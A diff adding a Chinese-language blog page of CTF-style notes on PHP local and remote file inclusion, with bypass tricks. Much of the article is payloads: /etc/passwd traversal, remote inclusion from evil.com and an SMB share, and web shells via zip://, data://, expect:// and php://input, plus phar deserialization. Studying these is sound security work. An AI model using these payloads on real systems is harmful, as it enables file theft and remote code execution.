@@ -1,0 +1,757 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Tools Kadimus - https:&#x2F;&#x2F;github.com&#x2F;P0cL4bs&#x2F;Kadimus LFISuite - https:&#x2F;&#x2F;github.com&#x2F;D35m0nd142&#x2F;LFISuite fimap - https:&#x2F;&#x2F;github.com&#x2F;kurobeats&#x2F;fimap  从PHP5.2开始，在默认情况下，allow_url_include是禁用的。  allow_url_fope">
+<meta property="og:type" content="article">
+<meta property="og:title" content="File Inclusion(Base on PHP)">
+<meta property="og:url" content="http://example.com/2020/03/18/file_inclusion/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Tools Kadimus - https:&#x2F;&#x2F;github.com&#x2F;P0cL4bs&#x2F;Kadimus LFISuite - https:&#x2F;&#x2F;github.com&#x2F;D35m0nd142&#x2F;LFISuite fimap - https:&#x2F;&#x2F;github.com&#x2F;kurobeats&#x2F;fimap  从PHP5.2开始，在默认情况下，allow_url_include是禁用的。  allow_url_fope">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-03-18T14:31:09.000Z">
+<meta property="article:modified_time" content="2020-03-19T12:50:30.000Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="PHP">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>File Inclusion(Base on PHP) - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5-a","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="File Inclusion(Base on PHP)"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2020-03-18 22:31" pubdate>
+          2020年3月18日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          49 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">File Inclusion(Base on PHP)</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/P0cL4bs/Kadimus">Kadimus - https://github.com/P0cL4bs/Kadimus</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/D35m0nd142/LFISuite">LFISuite - https://github.com/D35m0nd142/LFISuite</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/kurobeats/fimap">fimap - https://github.com/kurobeats/fimap</a></li>
+</ul>
+<p>从PHP5.2开始，在默认情况下，<code>allow_url_include</code>是禁用的。</p>
+<ul>
+<li><p>allow_url_fopen 默认为 On</p>
+<p><code>是否允许将URL（如http：//或ftp：//）作为文件处理。</code></p>
+</li>
+<li><p>allow_url_include 默认为 Off</p>
+<p><code>是否允许include/require打开URL（如http：//或ftp：//）作为文件处理。</code></p>
+</li>
+</ul>
+<p>你可以通过php.ini启用allow_url_include：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">/etc/php7/apache2/php.ini<br>allow_url_include = On<br></code></pre></td></tr></table></figure>
+
+<p>当 <code>allow_url_include</code> 为 On 且 <code>allow_url_fopen</code> 为 On 的时候：</p>
+<ul>
+<li>5.2版本的PHP，默认开启了register_globals，包含的是 txt 然而被解析成了PHP。</li>
+</ul>
+<p>当 <code>allow_url_include</code> 为 On 而 <code>allow_url_fopen</code> 为 Off 的时候：</p>
+<ul>
+<li>需通过 <code>php://input</code> 伪协议进行包含，只是都需要 <code>allow_url_include</code> 为On</li>
+</ul>
+<h1 id="Basic-LFI"><a href="#Basic-LFI" class="headerlink" title="Basic LFI"></a>Basic LFI</h1><p>LFI(Local File Inclusion，本地文件包含)</p>
+<p>利用目录穿越读取文件：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">52</span>hertz.tech<span class="hljs-regexp">/index.php?page=../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br></code></pre></td></tr></table></figure>
+
+<h2 id="Null-Byte"><a href="#Null-Byte" class="headerlink" title="Null Byte"></a>Null Byte</h2><p>这种情况是服务端在文件包含的时候添加了一个固定的文件后缀比如是(.php)，这样会导致请求&#x2F;etc&#x2F;passwd会变成&#x2F;etc&#x2F;passwd.php，这样就找不到文件了。</p>
+<p>在 PHP 版本低于 5.3.4 我们可以使用00截断(空字节截断)，因为%00在C语言中代表结束，PHP是基于C语言的。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">http://52hertz.tech/index.php?page=../../../etc/passwd%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="Double-encoding"><a href="#Double-encoding" class="headerlink" title="Double encoding"></a>Double encoding</h2><p>二次编码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">http://52hertz.tech/index.php?page=%252e%252e%252fetc%252fpasswd<br>http://52hertz.tech/index.php?page=%252e%252e%252fetc%252fpasswd%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="UTF-8-encoding"><a href="#UTF-8-encoding" class="headerlink" title="UTF-8 encoding"></a>UTF-8 encoding</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">http://52hertz.tech/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd<br>http://52hertz.tech/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="Path-and-dot-truncation"><a href="#Path-and-dot-truncation" class="headerlink" title="Path and dot truncation"></a>Path and dot truncation</h2><p>长度截断：大多数情况下，一直重复目录字符串 <code>./</code> ，超过4096个字节的文件名将被剪切掉(Windows 下是256byte)，因此多余的字符将被丢弃。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">http://52hertz.tech/index.php?page=../../../etc/passwd............[ADD MORE]<br>http://52hertz.tech/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]<br>http://52hertz.tech/index.php?page=../../../etc/passwd/./././././.[ADD MORE] <br>http://52hertz.tech/index.php?page=../../../[ADD MORE]../../../../etc/passwd<br></code></pre></td></tr></table></figure>
+
+<h2 id="Filter-bypass-tricks"><a href="#Filter-bypass-tricks" class="headerlink" title="Filter bypass tricks"></a>Filter bypass tricks</h2><p>当然有时候可能过滤掉 <code>./</code>，有一些 bypass 的小技巧</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">http://52hertz.tech/index.php?page=....//....//etc/passwd<br>http://52hertz.tech/index.php?page=..///////..////..//////etc/passwd<br>http://52hertz.tech/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd<br></code></pre></td></tr></table></figure>
+
+<h1 id="Basic-RFI"><a href="#Basic-RFI" class="headerlink" title="Basic RFI"></a>Basic RFI</h1><p>LFI(Remote File Inclusion，远程文件包含)，漏洞条件：<code>allow_url_include</code> 为 <code>On</code></p>
+<p>Most of the filter bypasses from LFI section can be reused for RFI.</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">52</span>hertz.tech<span class="hljs-regexp">/index.php?page=http:/</span><span class="hljs-regexp">/evil.com/</span>shell.txt<br></code></pre></td></tr></table></figure>
+
+<h2 id="Null-byte"><a href="#Null-byte" class="headerlink" title="Null byte"></a>Null byte</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">52</span>hertz.tech<span class="hljs-regexp">/index.php?page=http:/</span><span class="hljs-regexp">/evil.com/</span>shell.txt%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="Double-encoding-1"><a href="#Double-encoding-1" class="headerlink" title="Double encoding"></a>Double encoding</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">52</span>hertz.tech/index.php?page=http:%<span class="hljs-number">252</span>f%<span class="hljs-number">252</span>fevil.com%<span class="hljs-number">252</span>fshell.txt<br></code></pre></td></tr></table></figure>
+
+<h2 id="Bypass-allow-url-include"><a href="#Bypass-allow-url-include" class="headerlink" title="Bypass allow_url_include"></a>Bypass allow_url_include</h2><p>当 <code>allow_url_include</code> and <code>allow_url_fopen</code> 都为 <code>Off</code>，可以利用SMB共享来绕过 php 远程文件包含的限制。</p>
+<ol>
+<li>新建一个 share 	</li>
+<li>在里面写入 php  : <code>shell.php</code></li>
+<li>然后进行包含 <code>http://52hertz.tech/index.php?page=\\6.6.6.6\share\shell.php</code></li>
+</ol>
+<p>freebuf 上 <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/203577.html">有一篇文章</a> 讲得比较详细</p>
+<h1 id="LFI-x2F-RFI-using-wrappers"><a href="#LFI-x2F-RFI-using-wrappers" class="headerlink" title="LFI &#x2F; RFI using wrappers"></a>LFI &#x2F; RFI using wrappers</h1><p>利用包装器来进行 LFI&#x2F;RFI</p>
+<h2 id="Wrapper-php-x2F-x2F-filter"><a href="#Wrapper-php-x2F-x2F-filter" class="headerlink" title="Wrapper php:&#x2F;&#x2F;filter"></a>Wrapper php:&#x2F;&#x2F;filter</h2><p>详细文档 <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/wrappers.php.php">在这</a></p>
+<p>大小写不敏感：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">http://52hertz.tech/index.php?page=php://<span class="hljs-built_in">filter</span>/read=string.rot13/resource=index.php<br>http://52hertz.tech/index.php?page=php://<span class="hljs-built_in">filter</span>/convert.iconv.utf-<span class="hljs-number">8.</span>utf-<span class="hljs-number">16</span>/resource=index.php<br>http://52hertz.tech/index.php?page=php://<span class="hljs-built_in">filter</span>/convert.base64-encode/resource=index.php<br>http://52hertz.tech/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php<br></code></pre></td></tr></table></figure>
+
+<p>可以与大型文件的压缩包装器链接在一起</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">http://52hertz.tech/index.php?page=php://<span class="hljs-built_in">filter</span>/zlib.deflate/convert.base64-encode/resource=/etc/passwd<br></code></pre></td></tr></table></figure>
+
+<p>NOTE：Wrappers 可以用 <code>|</code> or <code>/</code> 进行多次链接:</p>
+<ul>
+<li>Multiple base64 decodes: <code>php://filter/convert.base64-decoder|convert.base64-decode|convert.base64-decode/resource=%s</code></li>
+<li>deflate then base64encode (useful for limited character exfil): <code>php://filter/zlib.deflate/convert.base64-encode/resource=/var/www/html/index.php</code></li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">./kadimus -u &quot;http://52hertz.tech/index.php?page=vuln&quot; -S -f &quot;index.php%00&quot; -O index.php --parameter page <br>curl &quot;http://52hertz.tech/index.php?page=php://filter/convert.base64-encode/resource=index.php&quot; | base64 -d &gt; index.php<br></code></pre></td></tr></table></figure>
+
+<h2 id="Wrapper-zip-x2F-x2F"><a href="#Wrapper-zip-x2F-x2F" class="headerlink" title="Wrapper zip:&#x2F;&#x2F;"></a>Wrapper zip:&#x2F;&#x2F;</h2><p>详细文档 <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/wrappers.compression.php">在这</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &quot;&lt;pre&gt;&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&lt;/pre&gt;&quot; &gt; payload.php;  <br>zip payload.zip payload.php;<br>mv payload.zip shell.jpg;<br>rm payload.php<br><br>http://52hertz.tech/index.php?page=zip://shell.jpg%23payload.php<br></code></pre></td></tr></table></figure>
+
+<h2 id="Wrapper-data-x2F-x2F"><a href="#Wrapper-data-x2F-x2F" class="headerlink" title="Wrapper data:&#x2F;&#x2F;"></a>Wrapper data:&#x2F;&#x2F;</h2><p>详细文档 <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/wrappers.data.php">在这</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">http://52hertz.tech/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=<br>//NOTE: the payload <span class="hljs-keyword">is</span> <span class="hljs-string">&quot;&lt;?php system($_GET[&#x27;cmd&#x27;]);echo &#x27;Shell done !&#x27;; ?&gt;&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>还有这个玩意：</p>
+<blockquote>
+<p>Fun fact: you can trigger an XSS and bypass the Chrome Auditor with : <code>http://52hertz.tech/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+</code></p>
+</blockquote>
+<h2 id="Wrapper-expect-x2F-x2F"><a href="#Wrapper-expect-x2F-x2F" class="headerlink" title="Wrapper expect:&#x2F;&#x2F;"></a>Wrapper expect:&#x2F;&#x2F;</h2><p>详细文档 <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/wrappers.expect.php">在这</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">http://example.com/index.php?page=expect://<span class="hljs-built_in">id</span><br>http://example.com/index.php?page=expect://ls<br></code></pre></td></tr></table></figure>
+
+<h2 id="Wrapper-input-x2F-x2F"><a href="#Wrapper-input-x2F-x2F" class="headerlink" title="Wrapper input:&#x2F;&#x2F;"></a>Wrapper input:&#x2F;&#x2F;</h2><p>这个在CTF一些基础的php题里面经常会碰到，当代码里含有 <code>file_get_contents($var,&#39;r&#39;)</code> 进行比较的时候，这个变量我们是可控的，可以绕过一些比对验证。</p>
+<p>使用方式：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">例如：<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$var</span>,<span class="hljs-string">&#x27;r&#x27;</span>) === <span class="hljs-string">&#x27;admin&#x27;</span>)<br>url: <span class="hljs-string">&quot;https://52hertz.tech/index.php?var=php://input&quot;</span><br><span class="hljs-comment">// 然后同时 POST 数据 &#x27;admin&#x27;，这样$var的值就是 admin 了</span><br></code></pre></td></tr></table></figure>
+
+<p>Note：<code>enctype=&quot;multipart/form-data&quot;</code> 的时候 <code> php://input</code> 是无效的。</p>
+<p>当然也可以通过 <code>curl</code> 命令来实现</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl -X POST --data &quot;admin&quot; &quot;https://52hertz.tech/index.php?var=php://input&quot;<br>curl -X POST --data &quot;&lt;?php echo shell_exec(&#x27;id&#x27;); ?&gt;&quot; &quot;https://52hertz.tech/index.php?page=php://input%00&quot; -k -v<br></code></pre></td></tr></table></figure>
+
+<p>另外，Kadimus具有自动执行此攻击的模块。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./kadimus -u &quot;https://52hertz.tech/index.php?page=php://input%00&quot;  -C &#x27;&lt;?php echo shell_exec(&quot;id&quot;); ?&gt;&#x27; -T input<br></code></pre></td></tr></table></figure>
+
+<h2 id="Wrapper-phar-x2F-x2F"><a href="#Wrapper-phar-x2F-x2F" class="headerlink" title="Wrapper phar:&#x2F;&#x2F;"></a>Wrapper phar:&#x2F;&#x2F;</h2><p>关于 <code>phar://</code> 的详细文档 <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/wrappers.phar.php">在这</a>，或者参看另一篇 <a href="">博客</a></p>
+<p>创建一个 <code>meta-data</code> 带有序列化对象的 phar 文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// create new Phar</span><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&#x27;test.txt&#x27;</span>, <span class="hljs-string">&#x27;text&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);<br><br><span class="hljs-comment">// add object of any class as meta data</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AnyClass</span> </span>&#123;&#125;<br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnyClass</span>;<br><span class="hljs-variable">$object</span>-&gt;data = <span class="hljs-string">&#x27;rips&#x27;</span>;<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$object</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br></code></pre></td></tr></table></figure>
+
+<p>如果现在通过 <code>phar://</code> 包装器对我们现有的 <code>phar</code> 文件执行文件操作，则其序列化的元数据将被反序列化。 如果此应用程序有一个名为AnyClass的类，并且定义了魔术方法<code>__destruct()</code>或<code>__wakeup()</code>，则将自动调用这些方法。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AnyClass</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;data;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// output: rips</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;phar://test.phar&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>Note: 在任何文件操作，<code>file_exists</code> 等中，都会为<code> phar://</code>触发反序列化。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web/" class="category-chain-item">Web</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
+      
+        <a href="/tags/Web/" class="print-no-link">#Web</a>
+      
+        <a href="/tags/PHP/" class="print-no-link">#PHP</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>File Inclusion(Base on PHP)</div>
+      <div>http://example.com/2020/03/18/file_inclusion/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2020年3月18日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/03/19/appstore_data_crawling/" title="基于App Store的App评论爬取">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">基于App Store的App评论爬取</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/03/15/CTFd_second_develop/" title="CTFd平台针对校赛的二次开发">
+                        <span class="hidden-mobile">CTFd平台针对校赛的二次开发</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
